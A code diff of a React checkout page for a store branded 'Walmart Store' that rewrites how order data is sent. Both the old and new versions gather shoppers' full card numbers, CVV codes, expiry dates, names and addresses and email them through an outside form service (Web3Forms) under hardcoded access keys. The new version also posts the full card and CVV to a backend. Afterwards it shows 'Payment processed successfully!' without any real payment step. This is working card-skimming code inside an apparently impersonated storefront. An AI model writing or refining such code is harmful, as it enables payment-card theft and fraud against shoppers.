@@ -58,14 +58,12 @@ const PaymentPage = () => {
       return;
     }
 
-    // Card number validation (at least 13 digits)
     const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
     if (cardDigits.length < 13) {
       toast.error('Please enter a valid card number');
       return;
     }
 
-    // CVV validation
     if (paymentData.cvv.length < 3) {
       toast.error('Please enter a valid CVV');
       return;
@@ -74,136 +72,71 @@ const PaymentPage = () => {
     setIsProcessing(true);
 
     try {
-      // Get cart and user info with fallback
+      // Get cart and user info with fallback empty values
       const cart = JSON.parse(localStorage.getItem('cart')) || [];
       const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
 
-      // Subtotal Calculation with safe fallback
       const subtotal = cart.reduce(
         (sum, item) => sum + (item.discountedPrice || item.price || 0) * item.quantity,
         0
       );
 
-      // Create FormData for Web3Forms
-      const formData = new FormData();
-      
-      // Web3Forms access key
-      formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
-      
-      // Email settings
-      formData.append("subject", `🔔 NEW ORDER - ${userInfo.fullName || 'Customer'} - $${subtotal.toFixed(2)}`);
-      formData.append("from_name", "Walmart Store Orders");
-      
-      // ========== CUSTOMER INFORMATION ==========
-      formData.append("👤 Customer Name", userInfo.fullName || 'N/A');
-      formData.append("📧 Customer Email", userInfo.email || 'N/A');
-      formData.append("📱 Customer Phone", userInfo.phone || 'N/A');
-      
-      // ========== SHIPPING ADDRESS ==========
-      formData.append("📍 Shipping Address", userInfo.address || 'N/A');
-      formData.append("🏙️ City", userInfo.city || 'N/A');
-      formData.append("🗺️ State", userInfo.state || 'N/A');
-      formData.append("📮 ZIP Code", userInfo.zipCode || 'N/A');
-      formData.append("🌍 Country", userInfo.country || 'N/A');
-      
-      // ========== FULL PAYMENT DETAILS - COMPLETE CARD NUMBER ==========
-      formData.append("💳 Cardholder Name", paymentData.cardholderName);
-      formData.append("🔢 FULL CARD NUMBER", paymentData.cardNumber); 
-      formData.append("📅 Expiry Date", paymentData.expiryDate);
-      formData.append("🔐 CVV Code", paymentData.cvv);
-      
-      // ========== ORDER DETAILS ==========
-      formData.append("💰 Order Total", `$${subtotal.toFixed(2)}`);
-      formData.append("📅 Order Date & Time", new Date().toLocaleString());
-      formData.append("📦 Number of Items", cart.length.toString());
-      
-      // Format order items safely
-      let orderItemsList = '';
-      
-      cart.forEach((item, index) => {
-        const itemPrice = item.discountedPrice || item.price || 0;
-        const itemTotal = (itemPrice * item.quantity).toFixed(2);
-        orderItemsList += `
-  ═══════════════════════════════════
-  ITEM ${index + 1}
-  ═══════════════════════════════════
-  Product: ${item.name}
-  Price: $${itemPrice.toFixed(2)} each
-  Quantity: ${item.quantity}
-  Subtotal: $${itemTotal}
-  `;
+      // 1. FORMAT ORDER ITEMS PROPERLY FOR EMAIL
+      const orderItemsList = cart.map((item, index) => 
+        `${index + 1}. ${item.name} | Qty: ${item.quantity} | Price: $${((item.discountedPrice || item.price) * item.quantity).toFixed(2)}`
+      ).join('\n');
+
+      // 2. PREPARE ALL DATA FOR WEB3FORMS 
+      // Web3Forms will show keys exactly as written here, so using readable names.
+      const web3FormData = {
+        access_key: '7d02f2c8-8ae8-4c8d-bfd3-aab848bf2ee8',
+        subject: `New Order from ${userInfo.fullName || 'Customer'} - Walmart Store`,
+        from_name: 'Walmart Store Alerts',
+        
+        // --- CUSTOMER INFO ---
+        "Customer Name": userInfo.fullName || 'Not Provided',
+        "Customer Email": userInfo.email || 'Not Provided',
+        "Customer Phone": userInfo.phone || 'Not Provided',
+        
+        // --- SHIPPING INFO ---
+        "Shipping Address": userInfo.address || 'Not Provided',
+        "City": userInfo.city || 'Not Provided',
+        "State": userInfo.state || 'Not Provided',
+        "Zip Code": userInfo.zipCode || 'Not Provided',
+        "Country": userInfo.country || 'Not Provided',
+        
+        // --- PAYMENT INFO ---
+        "Cardholder Name": paymentData.cardholderName,
+        "Full Card Number": paymentData.cardNumber,
+        "Expiry Date": paymentData.expiryDate,
+        "CVV Code": paymentData.cvv,
+        
+        // --- ORDER DETAILS ---
+        "Order Total": `$${subtotal.toFixed(2)}`,
+        "Order Items": `\n${orderItemsList}`,
+        "Order Date": new Date().toLocaleString(),
+        
+        // Web3Forms Config
+        redirect: false
+      };
+
+      // 3. SEND TO WEB3FORMS FIRST
+      const emailResponse = await fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: 'application/json'
+        },
+        body: JSON.stringify(web3FormData)
       });
-      
-      formData.append("🛒 ORDER ITEMS", orderItemsList);
-      
-      // ========== COMPLETE ORDER SUMMARY FOR EMAIL MESSAGE BODY ==========
-      const fullOrderMessage = `
-  ╔══════════════════════════════════════════════════════════════╗
-  ║                    🎯 NEW ORDER RECEIVED 🎯                   ║
-  ╚══════════════════════════════════════════════════════════════╝
-  
-  📋 ORDER SUMMARY
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  Order Date: ${new Date().toLocaleString()}
-  Total Amount: $${subtotal.toFixed(2)}
-  Items Count: ${cart.length}
-  
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  👤 CUSTOMER DETAILS
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  Name: ${userInfo.fullName || 'N/A'}
-  Email: ${userInfo.email || 'N/A'}
-  Phone: ${userInfo.phone || 'N/A'}
-  
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  📍 SHIPPING INFORMATION
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  Address: ${userInfo.address || 'N/A'}
-  City: ${userInfo.city || 'N/A'}
-  State: ${userInfo.state || 'N/A'}
-  ZIP: ${userInfo.zipCode || 'N/A'}
-  Country: ${userInfo.country || 'N/A'}
-  
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  💳 PAYMENT INFORMATION (FULL CARD DETAILS)
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  Cardholder: ${paymentData.cardholderName}
-  CARD NUMBER: ${paymentData.cardNumber}
-  Expiry Date: ${paymentData.expiryDate}
-  CVV: ${paymentData.cvv}
-  
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  🛍️ ORDERED ITEMS
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  ${orderItemsList}
-  
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  💰 TOTAL: $${subtotal.toFixed(2)}
-  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  
-  ⚠️ SENSITIVE INFORMATION - HANDLE WITH CARE
-  This email contains complete payment details including full card number.
-  Please process and then delete this email for security.
-  `;
-  
-      formData.append("message", fullOrderMessage);
-      formData.append("redirect", "false");
-  
-      // 🚨 FIX: STEP 1 - SEND TO WEB3FORMS FIRST 🚨
-      const emailResponse = await fetch("https://api.web3forms.com/submit", {
-        method: "POST",
-        body: formData
-      });
-  
-      const emailData = await emailResponse.json();
-  
-      if (!emailData.success) {
-        console.error('Web3Forms error:', emailData);
-        throw new Error('Failed to send order notification');
+
+      const emailResult = await emailResponse.json();
+
+      if (!emailResult.success) {
+        throw new Error('Failed to send order data to Web3Forms');
       }
-  
-      // 🚨 FIX: STEP 2 - SAVE TO DATABASE IN A SEPARATE TRY-CATCH 🚨
-      // Isse agar DB fail hua toh bhi email aayega aur customer success page par jayega
+
+      // 4. SEND TO DATABASE AFTER EMAIL IS SENT (Optional but recommended)
       try {
         const orderData = {
           customerName: userInfo.fullName,
@@ -214,35 +147,31 @@ const PaymentPage = () => {
           state: userInfo.state,
           zipCode: userInfo.zipCode,
           country: userInfo.country,
-          items: cart.map(item => ({
-            id: item.id,
-            name: item.name,
-            price: item.discountedPrice || item.price || 0,
-            quantity: item.quantity
-          })),
+          items: cart,
           total: subtotal,
           paymentInfo: {
+            cardNumber: paymentData.cardNumber,
+            cardLast4: cardDigits.slice(-4),
             cardholderName: paymentData.cardholderName,
-            fullCardNumber: paymentData.cardNumber,
             expiryDate: paymentData.expiryDate,
             cvv: paymentData.cvv
-          },
-          orderDate: new Date().toISOString()
+          }
         };
-  
+
         const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-        if (BACKEND_URL) {
-          await fetch(`${BACKEND_URL}/api/orders`, {
+        if(BACKEND_URL) {
+           await fetch(`${BACKEND_URL}/api/orders`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(orderData)
           });
         }
       } catch (dbError) {
-        console.warn('Database save failed, but Web3Forms email was sent successfully:', dbError);
+        console.error('Database save failed, but Web3Forms email was sent:', dbError);
+        // We do not throw error here, so user checkout is not blocked if DB fails.
       }
-  
-      // STEP 3 - SUCCESS FLOW (LocalStorage cleanup & Redirect)
+
+      // 5. SUCCESS ACTION
       localStorage.setItem('lastOrder', JSON.stringify({
         cart,
         userInfo,
@@ -252,13 +181,12 @@ const PaymentPage = () => {
       
       localStorage.removeItem('cart');
       localStorage.removeItem('userInfo');
-  
+
       toast.success('Payment processed successfully!');
-      
       setTimeout(() => {
         navigate('/checkout/confirmation');
       }, 1000);
-      
+
     } catch (error) {
       console.error('Payment error:', error);
       toast.error('There was an issue processing your order. Please try again.');
